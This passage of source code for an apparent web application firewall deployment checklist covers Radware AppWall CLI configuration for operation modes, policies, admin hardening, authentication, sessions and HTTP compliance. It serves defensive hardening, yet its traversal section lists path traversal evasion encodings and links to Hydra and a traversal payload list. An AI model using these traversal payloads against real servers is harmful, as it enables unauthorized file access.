                        <p class="mb-4 text-gray-700">Recommended for highest security and when SSL/TLS termination is required. AppWall terminates client connections and creates new connections to backend servers.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure Reverse Proxy Mode</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">system</span> operation-mode</div>
                            <div><span class="code-highlight">operation-mode reverse-proxy</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">interface</span> eth1</div>
                            <div><span class="code-param">description</span> <span class="code-value">"External Interface"</span></div>
                            <div><span class="code-param">ip address</span> <span class="code-value">203.0.113.10/24</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">interface</span> eth2</div>
                            <div><span class="code-param">description</span> <span class="code-value">"Internal Interface"</span></div>
                            <div><span class="code-param">ip address</span> <span class="code-value">10.0.0.10/24</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">route</span> default gateway 203.0.113.1</div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Out-of-Path Mode</h5>
                        <p class="mb-4 text-gray-700">Ideal for monitoring-only deployments or when minimal latency impact is required. Traffic is mirrored to AppWall for analysis without affecting the flow.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure Out-of-Path Mode</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">system</span> operation-mode</div>
                            <div><span class="code-highlight">operation-mode out-of-path</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">interface</span> eth1</div>
                            <div><span class="code-param">description</span> <span class="code-value">"Management Interface"</span></div>
                            <div><span class="code-param">ip address</span> <span class="code-value">10.0.0.20/24</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">interface</span> eth2</div>
                            <div><span class="code-param">description</span> <span class="code-value">"Monitoring Interface"</span></div>
                            <div><span class="code-param">promiscuous-mode</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">route</span> default gateway 10.0.0.1</div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                    `
                },
                {
                    title: 'Initial Security Policy Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Begin with a properly configured security policy that allows legitimate traffic while detecting potential attacks.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Create and configure initial security policy</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Web-Portal"</span> <span class="code-param">description</span> <span class="code-value">"Main web portal protection"</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div class="code-comment"># Set policy to passive learning mode initially</div>
                            <div><span class="code-highlight">enforce-mode passive</span></div>
                            <div><span class="code-highlight">learning state enable</span></div>
                            <div><span class="code-param">learning duration</span> <span class="code-value">14</span></div>
                            <div class="code-comment"># Enable baseline security features</div>
                            <div><span class="code-param">http compliance</span> <span class="code-value">strict</span></div>
                            <div><span class="code-param">attack-signatures state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">attack-signatures sensitivity</span> <span class="code-value">medium</span></div>
                            <div class="code-comment"># Configure whitelist for testing systems</div>
                            <div><span class="code-command">whitelist</span> <span class="code-value">add</span> <span class="code-param">ip</span> <span class="code-value">192.168.10.0/24</span> <span class="code-param">description</span> <span class="code-value">"QA Testing subnet"</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Custom Block Page Configuration</h5>
                        <p class="mb-4 text-gray-700">Configure professional block pages that comply with your organization's branding and provide appropriate user guidance.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure custom block pages</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">block-page</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Corporate-Block-Page"</span></div>
                            <div><span class="code-command">block-page</span> <span class="code-value">"Corporate-Block-Page"</span></div>
                            <div><span class="code-param">type</span> <span class="code-value">custom</span></div>
                            <div><span class="code-param">template</span> <span class="code-value">default</span></div>
                            <div><span class="code-param">title</span> <span class="code-value">"Security Alert - Access Blocked"</span></div>
                            <div><span class="code-param">company-name</span> <span class="code-value">"Example Corporation"</span></div>
                            <div><span class="code-param">company-logo</span> <span class="code-value">upload</span> <span class="code-param">file</span> <span class="code-value">"/tmp/logo.png"</span></div>
                            <div><span class="code-param">contact-info</span> <span class="code-value">"Please contact security@example.com for assistance"</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-param">block-page</span> <span class="code-value">"Corporate-Block-Page"</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                    `
                },
                {
                    title: 'Administrative Security Hardening',
                    content: `
                        <p class="mb-4 text-gray-700">Properly securing administrative access to the WAF is critical to preventing compromise of the security system itself.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure secure admin access</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">system</span> administration</div>
                            <div class="code-comment"># Change default admin password</div>
                            <div><span class="code-highlight">user admin password</span></div>
                            <div class="code-comment"># Create role-based user accounts</div>
                            <div><span class="code-command">user</span> <span class="code-value">add</span> <span class="code-param">username</span> <span class="code-value">"security-admin"</span> <span class="code-param">role</span> <span class="code-value">"administrator"</span></div>
                            <div><span class="code-command">user</span> <span class="code-value">add</span> <span class="code-param">username</span> <span class="code-value">"policy-editor"</span> <span class="code-param">role</span> <span class="code-value">"security-editor"</span></div>
                            <div><span class="code-command">user</span> <span class="code-value">add</span> <span class="code-param">username</span> <span class="code-value">"monitor-only"</span> <span class="code-param">role</span> <span class="code-value">"security-viewer"</span></div>
                            <div class="code-comment"># Configure management access security</div>
                            <div><span class="code-command">ssh</span> <span class="code-param">allowed-networks</span> <span class="code-value">10.0.0.0/24</span></div>
                            <div><span class="code-command">gui</span> <span class="code-param">allowed-networks</span> <span class="code-value">10.0.0.0/24</span></div>
                            <div><span class="code-command">ssh</span> <span class="code-param">idle-timeout</span> <span class="code-value">600</span></div>
                            <div><span class="code-command">gui</span> <span class="code-param">idle-timeout</span> <span class="code-value">900</span></div>
                            <div><span class="code-command">gui</span> <span class="code-param">ssl-protocols</span> <span class="code-value">TLSv1.2 TLSv1.3</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Setting Up Backup and Recovery</h5>
                        <p class="mb-4 text-gray-700">Regular backups enable quick recovery from configuration issues or hardware failures.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure automated backups</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">system</span> maintenance</div>
                            <div><span class="code-command">backup</span> <span class="code-param">schedule</span> <span class="code-value">weekly</span> <span class="code-param">day</span> <span class="code-value">sunday</span> <span class="code-param">time</span> <span class="code-value">02:00</span></div>
                            <div><span class="code-command">backup</span> <span class="code-param">location</span> <span class="code-value">scp</span> <span class="code-param">server</span> <span class="code-value">10.0.0.50</span> <span class="code-param">path</span> <span class="code-value">"/backups/appwall"</span></div>
                            <div><span class="code-command">backup</span> <span class="code-param">credentials</span> <span class="code-param">username</span> <span class="code-value">"backup-user"</span> <span class="code-param">password</span></div>
                            <div><span class="code-command">backup</span> <span class="code-param">retain</span> <span class="code-value">10</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div class="code-comment"># Create an immediate backup</div>
                            <div><span class="code-command">system</span> backup create <span class="code-param">description</span> <span class="code-value">"Initial configuration backup"</span></div>
                        </div>
                    `
                }
            ],
            tools: [
                {
                    title: 'AppWall CLI',
                    icon: 'fa-terminal',
                    description: 'The command-line interface for Radware AppWall provides full control over deployment and configuration settings.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'Documentation'
                },
                {
                    title: 'Wireshark',
                    icon: 'fa-network-wired',
                    description: 'Network protocol analyzer for verifying traffic flow through AppWall and confirming proper WAF operation modes.',
                    link: 'https://www.wireshark.org/',
                    linkText: 'Website'
                },
                {
                    title: 'DefenseFlow',
                    icon: 'fa-shield-alt',
                    description: 'Radware\'s security orchestration tool that integrates with AppWall for centralized management of multiple WAF instances.',
                    link: 'https://www.radware.com/products/defenseflow/',
                    linkText: 'Website'
                },
                {
                    title: 'Traceroute / MTR',
                    icon: 'fa-route',
                    description: 'Network diagnostic tools to verify routing through the AppWall and confirm proper network path configuration.',
                    link: 'https://github.com/traviscross/mtr',
                    linkText: 'MTR GitHub'
                },
                {
                    title: 'Apache Benchmark (ab)',
                    icon: 'fa-tachometer-alt',
                    description: 'Load testing tool for validating AppWall performance in different deployment modes and traffic conditions.',
                    link: 'https://httpd.apache.org/docs/2.4/programs/ab.html',
                    linkText: 'Documentation'
                },
                {
                    title: 'AppWall Sync Tool',
                    icon: 'fa-sync-alt',
                    description: 'Radware\'s tool for policy synchronization between testing and production environments to ensure consistent configuration.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'Information'
                }
            ]
        },
        {
            id: 'mapping',
            title: '2. Web Application Mapping',
            subtitle: 'Application profiling, service definitions, and traffic learning',
            icon: 'fa-sitemap',
            priority: 'high',
            progress: 26,
            checklist: [
                {
                    title: '2.1 Web Application Definition',
                    icon: 'fa-globe',
                    items: [
                        { id: '2.1.1', text: 'Define web application services and their base URLs', priority: 'critical' },
                        { id: '2.1.2', text: 'Map application public entry points and domains', priority: 'high' },
                        { id: '2.1.3', text: 'Identify and document application architecture', priority: 'medium' },
                        { id: '2.1.4', text: 'Configure backend server pool definitions', priority: 'critical' },
                        { id: '2.1.5', text: 'Set up health checks for backend services', priority: 'high' },
                        { id: '2.1.6', text: 'Create logical application groupings', priority: 'medium' },
                        { id: '2.1.7', text: 'Define application dependencies and interconnections', priority: 'medium' }
                    ]
                },
                {
                    title: '2.2 Traffic Learning',
                    icon: 'fa-traffic-light',
                    items: [
                        { id: '2.2.1', text: 'Enable and configure traffic learning', priority: 'critical' },
                        { id: '2.2.2', text: 'Set appropriate learning thresholds', priority: 'high' },
                        { id: '2.2.3', text: 'Monitor learning process for accurate profiling', priority: 'high' },
                        { id: '2.2.4', text: 'Analyze and approve legitimate traffic patterns', priority: 'critical' },
                        { id: '2.2.5', text: 'Define learning timeframes for different traffic segments', priority: 'medium' },
                        { id: '2.2.6', text: 'Implement continuous learning for evolving applications', priority: 'high' }
                    ]
                },
                {
                    title: '2.3 Content Profiling',
                    icon: 'fa-file-alt',
                    items: [
                        { id: '2.3.1', text: 'Map URLs and expected file types', priority: 'high' },
                        { id: '2.3.2', text: 'Configure allowed parameter formats and lengths', priority: 'critical' },
                        { id: '2.3.3', text: 'Define content-type restrictions for various URLs', priority: 'high' },
                        { id: '2.3.4', text: 'Create file extension and MIME type validations', priority: 'high' },
                        { id: '2.3.5', text: 'Build data type definitions for form fields', priority: 'high' },
                        { id: '2.3.6', text: 'Define accepted character sets for parameters', priority: 'medium' },
                        { id: '2.3.7', text: 'Map file upload paths and restrictions', priority: 'critical' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'Effective Application Mapping',
                    content: `
                        <p class="mb-4 text-gray-700">Accurate application mapping is crucial for ensuring the WAF understands legitimate application behavior.</p>
                        
                        <h5 class="font-semibold mb-2 text-gray-800">Service Definition</h5>
                        <p class="mb-4 text-gray-700">Define all application services, entry points, and backend servers to ensure proper protection coverage.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Define web application services</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">service</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"Main-Web-Portal"</span></div>
                            <div><span class="code-command">service</span> <span class="code-value">"Main-Web-Portal"</span></div>
                            <div><span class="code-param">virtual-ip</span> <span class="code-value">203.0.113.50</span></div>
                            <div><span class="code-param">virtual-port</span> <span class="code-value">443</span></div>
                            <div><span class="code-param">ssl-enabled</span> <span class="code-value">yes</span></div>
                            <div><span class="code-param">protocol</span> <span class="code-value">https</span></div>
                            <div><span class="code-param">hostname</span> <span class="code-value">www.example.com</span></div>
                            <div class="code-comment"># Define backend server pool</div>
                            <div><span class="code-command">server-pool</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"web-servers"</span></div>
                            <div><span class="code-command">server-pool</span> <span class="code-value">"web-servers"</span></div>
                            <div><span class="code-command">server</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">10.0.0.101</span> <span class="code-param">port</span> <span class="code-value">443</span></div>
                            <div><span class="code-command">server</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">10.0.0.102</span> <span class="code-param">port</span> <span class="code-value">443</span></div>
                            <div><span class="code-param">health-check</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">health-check interval</span> <span class="code-value">10</span></div>
                            <div><span class="code-param">health-check timeout</span> <span class="code-value">5</span></div>
                            <div><span class="code-param">health-check path</span> <span class="code-value">"/health.html"</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">service</span> <span class="code-value">"Main-Web-Portal"</span></div>
                            <div><span class="code-param">server-pool</span> <span class="code-value">"web-servers"</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                    `
                },
                {
                    title: 'Traffic Learning Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Implementing effective traffic learning enables the WAF to build a profile of legitimate application behavior.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure traffic learning</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">learning</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">duration</span> <span class="code-value">14</span></div>
                            <div><span class="code-param">confidence-level</span> <span class="code-value">high</span></div>
                            <div><span class="code-param">minimum-hits</span> <span class="code-value">50</span></div>
                            <div><span class="code-param">maximum-modifications</span> <span class="code-value">1000</span></div>
                            <div><span class="code-param">auto-apply-learned-rules</span> <span class="code-value">disable</span></div>
                            <div><span class="code-param">learn-from-trusted-sources-only</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">trusted-source</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">192.168.10.0/24</span></div>
                            <div><span class="code-command">trusted-source</span> <span class="code-value">add</span> <span class="code-param">address</span> <span class="code-value">10.50.0.0/16</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Learning Validation Process</h5>
                        <p class="mb-4 text-gray-700">Regularly review and validate learned application behavior to prevent potential security bypasses.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Review and accept learned rules</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">learning</span></div>
                            <div><span class="code-command">suggested-rules</span> <span class="code-value">show</span></div>
                            <div><span class="code-command">suggested-rules</span> <span class="code-value">apply-all</span></div>
                            <div><span class="code-command">suggested-urls</span> <span class="code-value">show</span></div>
                            <div><span class="code-command">suggested-urls</span> <span class="code-value">apply id</span> <span class="code-param">12345</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                    `
                }
            ],
            tools: [
                {
                    title: 'Web Crawler',
                    icon: 'fa-spider',
                    description: 'Automated tools to map all available application URLs and endpoints for comprehensive WAF configuration.',
                    link: 'https://www.zaproxy.org/',
                    linkText: 'OWASP ZAP'
                },
                {
                    title: 'Traffic Analyzer',
                    icon: 'fa-chart-bar',
                    description: 'Tools to analyze HTTP traffic patterns and identify common application behaviors and parameters.',
                    link: 'https://www.wireshark.org/',
                    linkText: 'Wireshark'
                },
                {
                    title: 'AppWall Learning Console',
                    icon: 'fa-graduation-cap',
                    description: 'Radware\'s built-in learning system for analyzing and approving learned application behaviors.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'Documentation'
                }
            ]
        },
        {
            id: 'authentication',
            title: '3. Authentication & Authorization',
            subtitle: 'User access controls, session management, and login protection',
            icon: 'fa-key',
            priority: 'critical',
            progress: 0,
            checklist: [
                {
                    title: '3.1 Authentication Protection',
                    icon: 'fa-user-lock',
                    items: [
                        { id: '3.1.1', text: 'Identify and map all authentication endpoints', priority: 'critical' },
                        { id: '3.1.2', text: 'Configure brute force protection for login pages', priority: 'critical' },
                        { id: '3.1.3', text: 'Set up rate limiting for authentication attempts', priority: 'high' },
                        { id: '3.1.4', text: 'Enable CAPTCHA or similar mechanisms for suspected attacks', priority: 'medium' },
                        { id: '3.1.5', text: 'Implement account lockout protection', priority: 'high' },
                        { id: '3.1.6', text: 'Configure geographic-based login restrictions if applicable', priority: 'medium' },
                        { id: '3.1.7', text: 'Enable alerting for authentication anomalies', priority: 'high' }
                    ]
                },
                {
                    title: '3.2 Session Management',
                    icon: 'fa-id-card',
                    items: [
                        { id: '3.2.1', text: 'Configure cookie security settings (HttpOnly, Secure flags)', priority: 'critical' },
                        { id: '3.2.2', text: 'Set up session token validation', priority: 'critical' },
                        { id: '3.2.3', text: 'Implement session hijacking protection', priority: 'critical' },
                        { id: '3.2.4', text: 'Enable session fixation prevention', priority: 'high' },
                        { id: '3.2.5', text: 'Configure session timeout enforcement', priority: 'medium' },
                        { id: '3.2.6', text: 'Implement cookie encryption if required', priority: 'high' },
                        { id: '3.2.7', text: 'Set up protection against cookie tampering', priority: 'high' }
                    ]
                },
                {
                    title: '3.3 Authorization Controls',
                    icon: 'fa-user-shield',
                    items: [
                        { id: '3.3.1', text: 'Identify and map access-controlled resources', priority: 'critical' },
                        { id: '3.3.2', text: 'Configure URL access control enforcement', priority: 'high' },
                        { id: '3.3.3', text: 'Set up parameter tampering protection', priority: 'critical' },
                        { id: '3.3.4', text: 'Implement forced browsing prevention', priority: 'high' },
                        { id: '3.3.5', text: 'Enable protection against directory traversal', priority: 'critical' },
                        { id: '3.3.6', text: 'Configure logical access control enforcement', priority: 'high' },
                        { id: '3.3.7', text: 'Set up insecure direct object reference protection', priority: 'high' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'Brute Force Protection Implementation',
                    content: `
                        <p class="mb-4 text-gray-700">Protect login endpoints from automated password guessing and credential stuffing attacks.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure brute force protection</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">brute-force-protection</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">login-url</span> <span class="code-value">"/login"</span></div>
                            <div><span class="code-param">username-parameter</span> <span class="code-value">"username"</span></div>
                            <div><span class="code-param">password-parameter</span> <span class="code-value">"password"</span></div>
                            <div><span class="code-param">max-attempts</span> <span class="code-value">5</span></div>
                            <div><span class="code-param">detection-period</span> <span class="code-value">300</span></div>
                            <div><span class="code-param">block-period</span> <span class="code-value">1800</span></div>
                            <div><span class="code-param">captcha-after-attempts</span> <span class="code-value">3</span></div>
                            <div><span class="code-param">alert-threshold</span> <span class="code-value">10</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                    `
                },
                {
                    title: 'Session Security Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Strengthen session management to prevent session hijacking and related attacks.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure session security</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">cookies</span></div>
                            <div><span class="code-command">cookie</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"SESSIONID"</span> <span class="code-param">type</span> <span class="code-value">"session-token"</span></div>
                            <div><span class="code-command">cookie</span> <span class="code-value">"SESSIONID"</span></div>
                            <div><span class="code-param">secure-flag</span> <span class="code-value">enforce</span></div>
                            <div><span class="code-param">httponly-flag</span> <span class="code-value">enforce</span></div>
                            <div><span class="code-param">samesite</span> <span class="code-value">lax</span></div>
                            <div><span class="code-param">sign</span> <span class="code-value">yes</span></div>
                            <div><span class="code-param">encrypt</span> <span class="code-value">no</span></div>
                            <div><span class="code-param">max-age</span> <span class="code-value">3600</span></div>
                            <div><span class="code-param">session-fixation-protection</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                    `
                },
                {
                    title: 'Directory Traversal Protection',
                    content: `
                        <p class="mb-4 text-gray-700">Prevent attackers from accessing files outside the web root directory using path traversal techniques.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure directory traversal protection</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">url-protection</span></div>
                            <div><span class="code-param">directory-traversal-detection</span> <span class="code-value">strict</span></div>
                            <div><span class="code-param">path-normalization</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">decode-url-multiple-times</span> <span class="code-value">yes</span></div>
                            <div><span class="code-param">max-url-depth</span> <span class="code-value">8</span></div>
                            <div class="code-comment"># Allow specific directories that might contain "../" legitimately</div>
                            <div><span class="code-command">directory-traversal-exception</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/code-examples/"</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <p class="mb-4 mt-4 text-gray-700">Directory traversal protection must handle various evasion techniques including:</p>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li>Double and triple encoding: <code>%252e%252e%252f</code> (triple-encoded "../")</li>
                            <li>Path normalization bypasses: <code>..././..././</code></li>
                            <li>Unicode/UTF-8 variants: <code>%c0%ae%c0%ae%c0%af</code></li>
                            <li>Backslash variations: <code>..\\..\\</code></li>
                            <li>Non-standard path separators: <code>..;/..;/</code></li>
                        </ul>
                    `
                }
            ],
            tools: [
                {
                    title: 'Authentication Tester',
                    icon: 'fa-unlock',
                    description: 'Tools to test login security and brute force protection effectiveness.',
                    link: 'https://www.kali.org/tools/hydra/',
                    linkText: 'Hydra'
                },
                {
                    title: 'Session Analyzer',
                    icon: 'fa-cookie',
                    description: 'Analyze session tokens for randomness, security flags, and proper implementation.',
                    link: 'https://www.zaproxy.org/',
                    linkText: 'OWASP ZAP'
                },
                {
                    title: 'Path Traversal Tester',
                    icon: 'fa-folder-open',
                    description: 'Test for directory traversal vulnerabilities with various bypass techniques.',
                    link: 'https://github.com/payloadbox/directory-traversal-payload-list',
                    linkText: 'Payload List'
                }
            ]
        },
        {
            id: 'protocol',
            title: '4. HTTP Protocol Validation',
            subtitle: 'Protocol compliance, header validations, and content-type enforcement',
            icon: 'fa-file-code',
            priority: 'high',
            progress: 8,
            checklist: [
                {
                    title: '4.1 HTTP Protocol Compliance',
                    icon: 'fa-check-double',
                    items: [
                        { id: '4.1.1', text: 'Enforce HTTP RFC compliance standards', priority: 'high' },
                        { id: '4.1.2', text: 'Set maximum allowed HTTP header size', priority: 'medium' },
                        { id: '4.1.3', text: 'Configure maximum URL length restrictions', priority: 'high' },
                        { id: '4.1.4', text: 'Set allowed HTTP methods (GET, POST, etc.)', priority: 'critical' },
                        { id: '4.1.5', text: 'Configure HTTP version restrictions', priority: 'medium' },
                        { id: '4.1.6', text: 'Enable validation of HTTP request format', priority: 'high' },
                        { id: '4.1.7', text: 'Implement protection against HTTP method tampering (VERB tampering)', priority: 'high' },
                        { id: '4.1.8', text: 'Configure protection against HTTP request smuggling', priority: 'critical' },
                        { id: '4.1.9', text: 'Set up HTTP header folding checks', priority: 'medium' }
                    ]
                },
                {
                    title: '4.2 Request Header Validation',
                    icon: 'fa-heading',
                    items: [
                        { id: '4.2.1', text: 'Set required and optional HTTP headers', priority: 'high' },
                        { id: '4.2.2', text: 'Configure content-type header validation', priority: 'critical' },
                        { id: '4.2.3', text: 'Set up host header validation', priority: 'critical' },
                        { id: '4.2.4', text: 'Implement referer header protection policies', priority: 'medium' },
                        { id: '4.2.5', text: 'Configure user-agent validation', priority: 'medium' },
                        { id: '4.2.6', text: 'Set cookie header validation rules', priority: 'high' },
                        { id: '4.2.7', text: 'Prevent header injection attacks', priority: 'high' },
                        { id: '4.2.8', text: 'Implement protection against malicious headers', priority: 'high' },
                        { id: '4.2.9', text: 'Configure length restrictions for header values', priority: 'medium' }
                    ]
                },
                {
                    title: '4.3 Response Validation',
                    icon: 'fa-reply',
                    items: [
                        { id: '4.3.1', text: 'Configure security-related response headers', priority: 'critical' },
                        { id: '4.3.2', text: 'Set up Content-Security-Policy headers', priority: 'high' },
                        { id: '4.3.3', text: 'Implement X-XSS-Protection headers', priority: 'high' },
                        { id: '4.3.4', text: 'Configure X-Frame-Options for clickjacking protection', priority: 'high' },
                        { id: '4.3.5', text: 'Set up HSTS (HTTP Strict Transport Security)', priority: 'high' },
                        { id: '4.3.6', text: 'Configure X-Content-Type-Options: nosniff', priority: 'medium' },
                        { id: '4.3.7', text: 'Set up Referrer-Policy headers', priority: 'medium' },
                        { id: '4.3.8', text: 'Implement Feature-Policy/Permissions-Policy headers', priority: 'medium' },
                        { id: '4.3.9', text: 'Configure response body inspection for sensitive data leakage', priority: 'high' }
                    ]
                },
                {
                    title: '4.4 HTTP Evasion Protection',
                    icon: 'fa-user-secret',
                    items: [
                        { id: '4.4.1', text: 'Configure protection against URL encoding evasion', priority: 'critical' },
                        { id: '4.4.2', text: 'Set up multi-layer URL decoding', priority: 'high' },
                        { id: '4.4.3', text: 'Implement Unicode/UTF-8 normalization', priority: 'high' },
                        { id: '4.4.4', text: 'Configure null byte injection protection', priority: 'critical' },
                        { id: '4.4.5', text: 'Set up backslash normalization', priority: 'medium' },
                        { id: '4.4.6', text: 'Implement alternative character representation handling', priority: 'high' },
                        { id: '4.4.7', text: 'Configure protection against comment-based evasion techniques', priority: 'medium' },
                        { id: '4.4.8', text: 'Set up protection against HTTP parameter pollution', priority: 'high' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'HTTP Protocol Compliance Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Enforce strict HTTP protocol compliance to prevent evasion techniques and protocol-based attacks.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure HTTP protocol compliance</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">http-compliance</span></div>
                            <div><span class="code-param">mode</span> <span class="code-value">strict</span></div>
                            <div><span class="code-param">max-header-length</span> <span class="code-value">8192</span></div>
                            <div><span class="code-param">max-url-length</span> <span class="code-value">2048</span></div>
                            <div><span class="code-param">max-headers</span> <span class="code-value">50</span></div>
                            <div><span class="code-param">allowed-methods</span> <span class="code-value">GET POST PUT DELETE HEAD OPTIONS</span></div>
                            <div><span class="code-param">block-invalid-headers</span> <span class="code-value">true</span></div>
                            <div><span class="code-param">require-host-header</span> <span class="code-value">true</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">HTTP Request Smuggling Protection</h5>
                        <p class="mb-4 text-gray-700">HTTP request smuggling vulnerabilities can lead to cache poisoning, response queue poisoning, and security bypasses.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure protection against HTTP request smuggling</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">http-compliance</span></div>
                            <div><span class="code-param">prevent-request-smuggling</span> <span class="code-value">true</span></div>
                            <div><span class="code-param">validate-content-length</span> <span class="code-value">strict</span></div>
                            <div><span class="code-param">validate-chunked-encoding</span> <span class="code-value">strict</span></div>
                            <div><span class="code-param">block-duplicate-headers</span> <span class="code-value">true</span></div>
                            <div><span class="code-param">normalize-line-folding</span> <span class="code-value">true</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                    `
                },
                {
                    title: 'Security Headers Implementation',
                    content: `
                        <p class="mb-4 text-gray-700">Configure security headers to enhance client-side security and prevent common web vulnerabilities.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure security headers</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">security-headers</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
